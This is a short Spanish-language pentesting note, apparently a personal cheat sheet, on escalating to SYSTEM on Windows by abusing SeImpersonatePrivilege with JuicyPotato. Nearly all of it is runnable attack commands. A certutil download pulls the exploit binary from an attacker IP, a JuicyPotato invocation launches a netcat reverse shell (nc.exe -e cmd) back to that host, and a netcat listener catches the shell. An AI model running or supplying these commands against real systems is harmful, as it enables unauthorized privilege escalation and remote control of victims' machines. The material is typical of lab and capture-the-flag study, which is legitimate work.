Cuando tenemos el privilegio 'SeImpersonatePrivilege', podemos realizar un ataque a este privilegio que nos permitirá escalar privilegios a usuario 'nt authority/system'.

Descargamos el fichero de: 
`https://github.com/ohpe/juicy-potato/releases`
Subimos este fichero al servidor vulnerable en el que hemos podido entrar, en 'C:\Windows\TEmp'. Además habrá que subir tambien 'nc.exe':
`certutil.exe -f -urlcache -split http://10.10.16.9/JuicyPotato.exe JuicyPotato.exe`
Ejecutamos el binario:
`JuicyPotato.exe -c -p C:\Windows\System32\cmd.exe -a "C:\Windows\Temp\nc.exe -e cmd 10.10.16.9 443" -l 1222`
En local debemos tener un puerto en escucha:
`rlwrap nc -nlvp 443`